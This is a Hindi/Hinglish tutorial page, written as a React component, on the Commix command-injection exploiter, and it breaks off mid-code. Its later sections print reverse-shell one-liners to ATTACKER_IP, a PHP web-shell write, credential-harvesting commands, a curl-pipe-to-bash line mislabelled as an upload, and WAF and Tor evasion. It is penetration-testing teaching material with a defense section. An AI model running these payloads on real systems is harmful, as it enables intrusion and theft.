import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Commix() {
  return (
    <TutorialLayout
      title="commix"
      subtitle="Automated command injection exploiter — OS command injection detection and exploitation"
      icon="💉"
      prev={{ to: '/tool/amass', label: 'amass' }}
      next={{ to: '/tool/searchsploit', label: 'searchsploit' }}
    >
      <h2>What is Commix?</h2>
      <p>
        Commix (Command Injection Exploiter) एक शक्तिशाली ओपन सोर्स टूल है जो वेब एप्लिकेशंस में OS command injection vulnerabilities को automatically detect और exploit करता है। यह Python में लिखा गया है और penetration testers, bug bounty hunters, और red teamers के लिए बहुत उपयोगी है। यह GET, POST, cookie, HTTP headers और user-agent parameters में command injection ढूंढ सकता है।
      </p>
      <p>
        Commix को Anastasios Stasinopoulos (ancst) ने 2015 में बनाया था। यह टूल manual command injection testing को automate करता है। पहले जो काम security researchers को manually करना पड़ता था — different payloads try करना, encoding techniques apply करना, blind injection detect करना — Commix यह सब automatically कर देता है। यह Kali Linux में pre-installed आता है।
      </p>
      <p>
        Command injection सबसे खतरनाक vulnerabilities में से एक है। जब कोई web application user input को सीधे OS commands में pass करता है, तो attacker arbitrary commands execute कर सकता है। Commix इस vulnerability को ढूंढकर full system access तक पहुंचने में मदद करता है। यह CTF competitions और real-world penetration testing दोनों में इस्तेमाल होता है।
      </p>
      <p>
        Commix का architecture modular है — injection detection, payload generation, और exploitation अलग-अलग modules में काम करते हैं। यह classic injection से लेकर advanced blind injection तक सभी techniques support करता है। इसमें built-in tamper scripts भी हैं जो WAF bypass करने में मदद करते हैं।
      </p>
      <p>
        Commix SQLmap से inspired है — जैसे SQLmap SQL injection के लिए comprehensive automation provide करता है, वैसे ही Commix command injection के लिए करता है। दोनों का interface और workflow similar है, जिससे SQLmap users को Commix use करना आसान होता है। Commix Python 3.6+ पर run होता है और isme kisi bhi external dependency ki zarurat nahi hai — built-in payloads aur techniques sab included hain.
      </p>
      <p>
        Real-world penetration testing mein command injection bahut common hai — PHP, Python, Node.js, aur Java applications mein milta hai. Commix in sab languages ke code patterns ko samajhta hai aur accordingly payloads generate karta hai. Yeh blind injection ko bhi handle kar sakta hai — jab server koi direct output nahi deta, tab time-based aur file-based techniques se injection confirm karta hai. Bug bounty programs mein command injection critical severity ka hota hai — ek hi vulnerability se full server compromise ho sakta hai.
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Commix केवल अधिकृत penetration testing और security research में ही इस्तेमाल करें। बिना अनुमति के command injection exploitation अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत system access अपराध हो सकता है।
      </div>

      <h2>History of Commix</h2>
      <p>
        Commix का विकास 2015 में Anastasios Stasinopoulos ने शुरू किया था। उन्होंने देखा कि command injection testing के लिए कोई comprehensive automated tool नहीं था। Manual testing बहुत time-consuming था और कई injection techniques miss हो जाती थीं। इसलिए Commix बनाया गया।
      </p>
      <p>
        2016 में Commix Kali Linux में शामिल हुआ और जल्दी ही penetration testers का favorite tool बन गया। GitHub पर इसके 5,000+ stars हैं और active development जारी है। हर नए version में नई injection techniques और WAF bypass methods add होते हैं।
      </p>
      <p>
        Commix का नाम "Command Injection Exploiter" से आया है। यह टूल SQLmap से inspired है — SQLmap SQL injection के लिए जो करता है, Commix command injection के लिए वही करता है। दोनों का interface और workflow similar है, जिससे users को इस्तेमाल करना आसान होता है।
      </p>
      <p>
        2017-2018 में Commix ने tamper scripts introduce kiye — WAF bypass ke liye. Yeh SQLmap ke tamper scripts se inspired the. Space2comment, multipleslash, base64 encoding jaise techniques add hue. 2019 mein Commix ne JSON aur XML injection support add kiya — modern API testing ke liye zaruri tha. 2020 mein blind injection techniques improve hui — time-based detection zyada reliable ban gaya.
      </p>
      <p>
        2021 mein Commix ne Burp Suite integration add kiya — request files directly import kar sakte ho. 2022-2023 mein naye tamper scripts aur encoding techniques add hue. Aaj Commix 20+ injection techniques aur 10+ tamper scripts ke saath command injection testing ka sabse comprehensive tool hai. OWASP Testing Guide mein Commix recommended tool ke roop mein mention hota hai.
      </p>

      <h2>How Commix Works?</h2>
      <p>
        Commix कई चरणों में काम करता है — पहले injection point detect करता है, फिर injection type identify करता है, और finally exploitation करता है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Injection Detection:</strong> User-controlled parameters में OS command injection points ढूंढता है</li>
        <li><strong className="text-white">Technique Identification:</strong> Classic, eval-based, semicolons, pipes, logical operators जैसी techniques identify करता है</li>
        <li><strong className="text-white">Payload Generation:</strong> हर injection type के लिए suitable payloads generate करता है</li>
        <li><strong className="text-white">Response Analysis:</strong> Server responses analyze करके successful injection confirm करता है</li>
        <li><strong className="text-white">Blind Injection:</strong> Time-based और file-based blind injection support करता है</li>
        <li><strong className="text-white">WAF Bypass:</strong> Built-in tamper scripts से Web Application Firewalls bypass करता है</li>
        <li><strong className="text-white">Post-Exploitation:</strong> Shell access मिलने के बाद further exploitation करता है</li>
        <li><strong className="text-white">Multi-Parameter Testing:</strong> एक साथ कई parameters test कर सकता है</li>
      </ul>

      <h2>Installation</h2>
      <CodeBlock
        title="Commix Installation — Kali Linux"
        code={`# Kali Linux mein pre-installed:
sudo apt update
sudo apt install commix

# Version check:
python3 commix.py --version

# Help dekho:
python3 commix.py --help`}
      />
      <CodeBlock
        title="Commix Installation — Git se Latest"
        code={`# Git se (latest version):
git clone https://github.com/commixproject/commix.git
cd commix
pip3 install -r requirements.txt

# Python se directly run:
python3 commix.py --help

# Update karo (existing installation):
cd commix
git pull origin master`}
      />
      <CodeBlock
        title="Commix Installation — Docker aur pip"
        code={`# Docker se:
docker pull commixproject/commix
docker run -it commixproject/commix

# Docker se specific URL test:
docker run -it commixproject/commix --url="http://target.com/vuln.php?cmd=id"

# pip se (agar available hai):
pip3 install commix

# Termux (Android) mein:
pkg install python
pip install commix
python3 commix.py --help`}
      />

      <h2>Basic Usage</h2>
      <p>
        Commix का basic usage बहुत simple है — target URL दो और यह injection point ढूंढ लेगा।
      </p>
      <CodeBlock
        title="Basic Commands"
        code={`# Basic injection test:
python3 commix.py --url="http://target.com/vuln.php?cmd=id"

# POST parameter test:
python3 commix.py --url="http://target.com/vuln.php" --data="cmd=id"

# Cookie parameter test:
python3 commix.py --url="http://target.com/" --cookie="session=abc;cmd=id"

# Header injection test:
python3 commix.py --url="http://target.com/" --header="User-Agent: id"

# Multiple parameters test:
python3 commix.py --url="http://target.com/vuln.php?cmd=id&name=test"

# Verbose output:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" -v 3`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Flag</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--url</td><td className="py-2 px-3">Target URL specify करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--data</td><td className="py-2 px-3">POST data specify करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--cookie</td><td className="py-2 px-3">Cookie headers में injection test</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--header</td><td className="py-2 px-3">HTTP headers में injection test</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--agent</td><td className="py-2 px-3">User-Agent header में injection</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-v</td><td className="py-2 px-3">Verbosity level (0-3)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--technique</td><td className="py-2 px-3">Specific injection technique</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--tamper</td><td className="py-2 px-3">Tamper script use करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--os-cmd</td><td className="py-2 px-3">Specific OS command execute करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--shell</td><td className="py-2 px-3">Interactive shell प्राप्त करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--file-read</td><td className="py-2 px-3">Remote file read करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--file-write</td><td className="py-2 px-3">Remote file write करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--file-dest</td><td className="py-2 px-3">Destination file path</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--random-agent</td><td className="py-2 px-3">Random User-Agent use करें</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">--proxy</td><td className="py-2 px-3">Proxy server use करें</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Command Injection Types</h2>
      <p>
        Commix कई तरह की command injection techniques support करता है:
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Technique</th>
              <th className="text-left py-2 px-3 text-neon-green">Flag</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Classic</td><td className="py-2 px-3 font-mono">classic</td><td className="py-2 px-3">Semicolon (;) से command chain</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Eval-based</td><td className="py-2 px-3 font-mono">eval-based</td><td className="py-2 px-3">eval() function abuse</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Time-based</td><td className="py-2 px-3 font-mono">time-based</td><td className="py-2 px-3">Response delay से detect</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">File-based</td><td className="py-2 px-3 font-mono">file-based</td><td className="py-2 px-3">File write/read से confirm</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Pipe</td><td className="py-2 px-3 font-mono">pipe</td><td className="py-2 px-3">Pipe (|) operator</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Logical</td><td className="py-2 px-3 font-mono">logical</td><td className="py-2 px-3">AND (&&) OR (||) operators</td></tr>
            <tr><td className="py-2 px-3 text-white">Reverse</td><td className="py-2 px-3 font-mono">reverse</td><td className="py-2 px-3">Backticks command substitution</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Injection Techniques</h2>
      <CodeBlock
        title="Different Injection Methods"
        code={`# Semicolon injection:
# Input: ; id
# Executed: original_cmd ; id

# Pipe injection:
# Input: | id
# Executed: original_cmd | id

# Backtick injection:
# Input: \`id\`
# Executed: original_cmd \`id\`

# AND operator injection:
# Input: && id
# Executed: original_cmd && id

# OR operator injection:
# Input: || id
# Executed: original_cmd || id

# Newline injection:
# Input: %0a id
# Executed: original_cmd
# id

# Commix automatically sab techniques try karta hai
python3 commix.py --url="http://target.com/ping.php?ip=127.0.0.1"

# Specific technique force karo:
python3 commix.py --url="http://target.com/ping.php?ip=127.0.0.1" --technique=classic`}
      />

      <h2>Payload Generation</h2>
      <CodeBlock
        title="Custom Payloads"
        code={`# Default payloads use karo:
python3 commix.py --url="http://target.com/vuln.php?cmd=id"

# Custom command execute karo:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --os-cmd="whoami"

# Reverse shell payload:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --shell

# File read:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --file-read="/etc/passwd"

# File write:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --file-write="/tmp/test.txt" --file-dest="/var/www/html/test.txt"

# Blind injection (time-based):
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --technique=time-based

# Tamper script:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --tamper=space2comment`}
      />

      <h2>Tamper Techniques</h2>
      <p>
        Commix में built-in tamper scripts हैं जो WAF और input filters bypass करने में मदद करते हैं:
      </p>
      <CodeBlock
        title="Tamper Scripts"
        code={`# space2comment — spaces ko /**/ se replace:
python3 commix.py --url="http://target.com/vuln.php" --tamper=space2comment

# multipleslash — multiple slashes add karo:
python3 commix.py --url="http://target.com/vuln.php" --tamper=multipleslash

# base64 — Base64 encoding:
python3 commix.py --url="http://target.com/vuln.php" --tamper=base64

# hexencode — Hex encoding:
python3 commix.py --url="http://target.com/vuln.php" --tamper=hexencode

# rotate — Character rotation:
python3 commix.py --url="http://target.com/vuln.php" --tamper=rotate

# randomcase — Random case:
python3 commix.py --url="http://target.com/vuln.php" --tamper=randomcase

# Multiple tamper scripts:
python3 commix.py --url="http://target.com/vuln.php" --tamper=space2comment,randomcase`}
      />

      <h2>Blind Injection Deep Dive</h2>
      <p>
        Blind command injection tab hota hai jab server koi direct output nahi deta — attacker ko infer karna padta hai ki command execute hui ya nahi. Commix time-based aur file-based dono techniques support karta hai.
      </p>
      <CodeBlock
        title="Time-Based Blind Injection"
        code={`# Time-based detection:
# Commix sleep command inject karta hai aur response time measure karta hai
python3 commix.py --url="http://target.com/vuln.php?ip=127.0.0.1" --technique=time-based

# Manual verification:
# Agar 5 second delay aaye toh injection confirmed hai
# Input: ; sleep 5
# Response time > 5 seconds = VULNERABLE

# Custom sleep time:
python3 commix.py --url="http://target.com/vuln.php?ip=127.0.0.1" --technique=time-based --time-sec=10

# Detection tips:
# - Network latency consider karo
# - Multiple baar test karo — consistent delay = confirmed
# - Different sleep values try karo (3, 5, 10 seconds)`}
      />
      <CodeBlock
        title="File-Based Blind Injection"
        code={`# File-based detection:
# Commix ek file create karta hai aur check karta hai
python3 commix.py --url="http://target.com/vuln.php?ip=127.0.0.1" --technique=file-based

# Manual verification:
# Input: ; touch /tmp/commix_test
# Check: http://target.com/tmp/commix_test

# Web root mein file write:
# Input: ; echo "vulnerable" > /var/www/html/test.txt
# Check: http://target.com/test.txt

# File-based reverse shell:
python3 commix.py --url="http://target.com/vuln.php?ip=127.0.0.1" --file-write="<?php system($_GET['cmd']); ?>" --file-dest="/var/www/html/shell.php"`}
      />

      <h2>WAF Bypass Techniques</h2>
      <p>
        Web Application Firewalls (WAF) common payloads ko block kar dete hain. Commix ke tamper scripts aur custom techniques se WAF bypass karna possible hai.
      </p>
      <CodeBlock
        title="WAF Bypass Methods"
        code={`# Method 1: Tamper scripts combination
python3 commix.py --url="http://target.com/vuln.php" --tamper=space2comment,randomcase

# Method 2: Encoding techniques
python3 commix.py --url="http://target.com/vuln.php" --tamper=base64
python3 commix.py --url="http://target.com/vuln.php" --tamper=hexencode

# Method 3: Random User-Agent
python3 commix.py --url="http://target.com/vuln.php" --random-agent

# Method 4: Custom headers
python3 commix.py --url="http://target.com/vuln.php" --header="X-Forwarded-For: 127.0.0.1"

# Method 5: Proxy rotation (Tor)
python3 commix.py --url="http://target.com/vuln.php" --tor --tor-port=9050

# Method 6: Delay between requests
python3 commix.py --url="http://target.com/vuln.php" --delay=3

# Method 7: Multiple slashes
python3 commix.py --url="http://target.com/vuln.php" --tamper=multipleslash

# Method 8: Custom prefix/suffix
python3 commix.py --url="http://target.com/vuln.php" --prefix="'" --suffix="'"`}
      />

      <h2>JSON and XML Injection</h2>
      <p>
        Modern APIs JSON aur XML data accept karti hain — Commix in formats mein bhi command injection test kar sakta hai. Yeh REST API testing ke liye bahut useful hai.
      </p>
      <CodeBlock
        title="JSON API Injection"
        code={`# JSON POST data mein injection:
python3 commix.py --url="http://target.com/api" --data='{"cmd":"id"}' --header="Content-Type: application/json"

# Nested JSON:
python3 commix.py --url="http://target.com/api" --data='{"user":{"name":"test","cmd":"id"}}' --header="Content-Type: application/json"

# JSON array:
python3 commix.py --url="http://target.com/api" --data='[{"cmd":"id"}]' --header="Content-Type: application/json"

# Custom JSON field specify karo:
python3 commix.py --url="http://target.com/api" --data='{"search":"test"}' --header="Content-Type: application/json" -v 3`}
      />
      <CodeBlock
        title="XML Injection"
        code={`# XML data mein injection:
python3 commix.py --url="http://target.com/api" --data='<root><cmd>id</cmd></root>' --header="Content-Type: application/xml"

# SOAP API:
python3 commix.py --url="http://target.com/soap" --data='<soap:Envelope><soap:Body><cmd>id</cmd></soap:Body></soap:Envelope>' --header="Content-Type: text/xml"

# XXE + Command Injection combo:
# Pehle XXE check karo, phir command injection test karo`}
      />

      <h2>Reverse Shell Techniques</h2>
      <p>
        Jab command injection confirm ho jaye, next step hai reverse shell lena — interactive shell se full control milta hai target system par.
      </p>
      <CodeBlock
        title="Reverse Shell with Commix"
        code={`# Commix built-in reverse shell:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --shell

# Listener start karo (attacker machine):
nc -lvnp 4444

# Manual reverse shell payloads:
# Bash:
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python:
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat:
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# PHP:
; php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Windows:
; powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`}
      />

      <h2>Post-Exploitation</h2>
      <p>
        Command injection se shell milne ke baad further exploitation possible hai — system enumeration, privilege escalation, data exfiltration, aur persistence establish karna.
      </p>
      <CodeBlock
        title="Post-Exploitation Commands"
        code={`# System info gather karo:
whoami
id
uname -a
cat /etc/os-release

# Network info:
ifconfig
netstat -tulpn
cat /etc/hosts

# Sensitive files:
cat /etc/passwd
cat /etc/shadow (agar root ho)
cat /var/www/html/config.php
cat /var/www/html/.env

# Database credentials dhundho:
grep -r "password" /var/www/html/
grep -r "DB_PASSWORD" /var/www/html/

# Privilege escalation check:
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab

# File exfiltration:
# Base64 encode karo aur output mein dekho:
base64 /etc/passwd

# Ya file upload karo attacker machine par:
# Target par: curl http://ATTACKER_IP/upload.sh | bash`}
      />

      <h2>Integration with Other Tools</h2>
      <p>
        Commix akele kaafi nahi hai — complete web application testing ke liye doosre tools ke saath integrate karna chahiye. Burp Suite se traffic intercept karo, Nmap se services discover karo, aur SQLmap se SQL injection test karo.
      </p>
      <CodeBlock
        title="Commix + Burp Suite + SQLmap Workflow"
        code={`# Step 1: Nmap se target enumerate karo
nmap -sV -sC target.com

# Step 2: Burp Suite se traffic intercept karo
# Proxy: 127.0.0.1:8080
# Suspicious requests identify karo

# Step 3: Burp request file se Commix test
# Request file save karo (right-click → Save item)
python3 commix.py -r request.txt

# Step 4: SQLmap se SQL injection test
sqlmap -r request.txt --batch --dbs

# Step 5: Nikto se web server scan
nikto -h http://target.com

# Step 6: Gobuster se directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Step 7: Results combine karo
# Command injection + SQLi + directory traversal = complete picture`}
      />

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="Automation Script 1 — Batch Testing"
        code={`#!/bin/bash
# Kahi URLs test karo:

URLS_FILE="targets.txt"

while IFS= read -r url; do
  echo "[+] Testing: $url"
  python3 commix.py --url="$url" --batch --output-dir="/tmp/commix_results"

  if [ $? -eq 0 ]; then
    echo "[!] VULNERABLE: $url"
    echo "$url" >> vulnerable.txt
  fi
done < "$URLS_FILE"`}
      />
      <CodeBlock
        title="Automation Script 2 — CI/CD Integration"
        code={`#!/bin/bash
# CI/CD pipeline mein command injection testing:

TARGET_URL="$1"

# Commix scan:
python3 commix.py --url="$TARGET_URL" --batch --output-json="/tmp/commix.json"

# Results check:
VULNS=$(python3 -c "
import json
with open('/tmp/commix.json') as f:
    data = json.load(f)
print(len(data.get('vulnerabilities', [])))
")

if [ "$VULNS" -gt 0 ]; then
  echo "FAIL: $VULNS command injection vulnerabilities found!"
  exit 1
else
  echo "PASS: No command injection vulnerabilities found."
  exit 0
fi`}
      />
      <CodeBlock
        title="Automation Script 3 — Report Generation"
        code={`#!/bin/bash
# Full penetration test report:

TARGET="$1"
OUTPUT_DIR="/tmp/commix_report_$TARGET"

mkdir -p "$OUTPUT_DIR"

echo "[+] Starting command injection scan for $TARGET"

# URL parameters scan:
python3 commix.py --url="http://$TARGET/vuln.php?cmd=id" --output-dir="$OUTPUT_DIR" --batch

# POST data scan:
python3 commix.py --url="http://$TARGET/login.php" --data="username=admin&password=test" --output-dir="$OUTPUT_DIR" --batch

# Cookie scan:
python3 commix.py --url="http://$TARGET/" --cookie="session=abc123" --output-dir="$OUTPUT_DIR" --batch

echo "[+] Results saved to: $OUTPUT_DIR"`}
      />

      <h2>Comparison with Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">Commix</th>
              <th className="text-left py-2 px-3 text-neon-green">SQLmap</th>
              <th className="text-left py-2 px-3 text-neon-green">Manual Testing</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Target</td><td className="py-2 px-3">OS Command Injection</td><td className="py-2 px-3">SQL Injection</td><td className="py-2 px-3">Any vulnerability</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Automation</td><td className="py-2 px-3">Fully automated</td><td className="py-2 px-3">Fully automated</td><td className="py-2 px-3">Manual</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Blind Injection</td><td className="py-2 px-3">हाँ (time-based)</td><td className="py-2 px-3">हाँ (boolean/time)</td><td className="py-2 px-3">हाँ (manual)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">WAF Bypass</td><td className="py-2 px-3">Built-in tamper</td><td className="py-2 px-3">100+ tamper scripts</td><td className="py-2 px-3">Manual encoding</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Reverse Shell</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ (OS shell)</td><td className="py-2 px-3">Manual setup</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">File Operations</td><td className="py-2 px-3">Read/Write</td><td className="py-2 px-3">Read/Write</td><td className="py-2 px-3">Depends on skill</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Ease of Use</td><td className="py-2 px-3">Easy</td><td className="py-2 px-3">Easy</td><td className="py-2 px-3">Hard</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Detection Rate</td><td className="py-2 px-3">High</td><td className="py-2 px-3">Very High</td><td className="py-2 px-3">Depends on tester</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Speed</td><td className="py-2 px-3">Fast</td><td className="py-2 px-3">Fast</td><td className="py-2 px-3">Slow</td></tr>
            <tr><td className="py-2 px-3 text-white">Best For</td><td className="py-2 px-3">Command injection</td><td className="py-2 px-3">SQL injection</td><td className="py-2 px-3">Complex scenarios</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Injection point detect nahi ho raha', a: 'Verbosity badhao (-v 3). Manual testing karo pehle. Different techniques try karo (--technique=classic ya time-based).' },
          { q: 'WAF block kar raha hai', a: 'Tamper scripts use karo (--tamper=space2comment,randomcase). Random User-Agent (--random-agent). Proxy use karo (--proxy).' },
          { q: 'Blind injection confirm nahi ho raha', a: 'Time-based technique use karo (--technique=time-based). Response delay check karo. File-based technique try karo.' },
          { q: 'Reverse shell connect nahi ho raha', a: 'Firewall outbound traffic block kar raha hoga. Common ports try karo (80, 443, 53). Different shell types try karo.' },
          { q: 'Python error aa raha hai', a: 'Python 3.6+ install karo. Requirements install karo: pip3 install -r requirements.txt.' },
          { q: 'Slow scanning', a: 'Batch mode use karo (--batch). Unnecessary tests skip karo. Specific technique specify karo.' },
          { q: 'False positives', a: 'Manual verification karo. Multiple techniques se confirm karo. Output analyze karo carefully.' },
          { q: 'Cookie injection kaam nahi kar raha', a: 'Cookie format check karo. Session cookies valid hone chahiye. --cookie flag properly use karo.' },
          { q: 'JSON API injection kaam nahi kar raha', a: 'Content-Type header set karo: --header="Content-Type: application/json". JSON format valid hona chahiye.' },
          { q: 'POST data injection fail ho raha hai', a: 'Data format check karo. Special characters encode hone chahiye. --data flag properly use karo.' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Command injection attacks se kaise bache:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Input Validation:</strong> User input ko whitelist-based validation kare — special characters block kare</li>
        <li><strong className="text-white">Parameterized Commands:</strong> os.system() ya exec() ki jagah subprocess.run() with list arguments use kare</li>
        <li><strong className="text-white">Least Privilege:</strong> Web application ko minimum permissions de — root mein na chalaye</li>
        <li><strong className="text-white">WAF:</strong> Web Application Firewall deploy kare — command injection patterns block honge</li>
        <li><strong className="text-white">Input Sanitization:</strong> ;, |, &, `, $ jaise characters remove ya escape kare</li>
        <li><strong className="text-white">Sandboxing:</strong> User-controlled commands ko sandbox mein execute kare</li>
        <li><strong className="text-white">Logging:</strong> Sabhi command executions log kare — suspicious activity detect hogi</li>
        <li><strong className="text-white">Security Headers:</strong> Content-Security-Policy aur other security headers set kare</li>
        <li><strong className="text-white">Code Review:</strong> Regular code review kare — dangerous functions use ho rahi hain ya nahi</li>
        <li><strong className="text-white">Runtime Protection:</strong> Runtime Application Self-Protection (RASP) solutions use kare</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <p>
        Command injection practice ke liye safe lab banao:
      </p>
      <CodeBlock
        title="Practice Lab Setup"
        code={`# DVWA (Damn Vulnerable Web Application):
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# WebGoat:
docker run --rm -it -p 8080:8080 webgoat/webgoat

# Custom vulnerable PHP script:
# <?php
# if(isset($_GET['cmd'])) {
#     $cmd = $_GET['cmd'];
#     // VULNERABLE! Never do this in production
#     system($cmd);
# }
# ?>

# Practice workflow:
# 1. Lab setup karo
# 2. Manual testing se injection point dhundho
# 3. Commix se automated exploitation karo
# 4. Results verify karo
# 5. Remediation implement karo`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced Commix Usage"
        code={`# Burp Suite request file se test:
python3 commix.py -r request.txt

# JSON data injection:
python3 commix.py --url="http://target.com/api" --data='{"cmd":"id"}' --headers="Content-Type: application/json"

# Multi-threaded scanning:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --threads=10

# Custom payload:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --prefix="'" --suffix="'"

# Tor network se:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --tor

# Delay between requests:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --delay=2`}
      />
      <CodeBlock
        title="Custom Tamper Script Creation"
        code={`# Custom tamper script banao:
# /commix/tamper/custom_encode.py

#!/usr/bin/env python3
"""Custom encoding tamper script"""

def tamper(payload):
    # Double URL encoding:
    import urllib.parse
    encoded = urllib.parse.quote(payload)
    double_encoded = urllib.parse.quote(encoded)
    return double_encoded

# Use karo:
python3 commix.py --url="http://target.com/vuln.php" --tamper=custom_encode

# Tamper script ideas:
# - Unicode encoding
# - HTML entity encoding
# - Mixed case
# - Comment injection
# - Null byte insertion`}
      />
      <CodeBlock
        title="Evasion Techniques"
        code={`# Method 1: Random delays
python3 commix.py --url="http://target.com/vuln.php" --delay=5

# Method 2: Random User-Agent
python3 commix.py --url="http://target.com/vuln.php" --random-agent

# Method 3: Tor proxy
python3 commix.py --url="http://target.com/vuln.php" --tor --tor-port=9050

# Method 4: Custom proxy chain
python3 commix.py --url="http://target.com/vuln.php" --proxy="socks5://127.0.0.1:1080"

# Method 5: Chunked transfer encoding
python3 commix.py --url="http://target.com/vuln.php" --chunked

# Method 6: HTTP/2 support
python3 commix.py --url="http://target.com/vuln.php" --http2

# Method 7: Custom cookies
python3 commix.py --url="http://target.com/vuln.php" --cookie="session=abc;csrf=xyz"`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        Commix ka output analyze karna important hai — structured reporting se findings clearly present hoti hain.
      </p>
      <CodeBlock
        title="Output Analysis"
        code={`# JSON output save karo:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --output-json="/tmp/results.json"

# Text output save karo:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --output-file="/tmp/results.txt"

# Output parse karo (Python):
import json
with open('/tmp/results.json') as f:
    data = json.load(f)

for vuln in data.get('vulnerabilities', []):
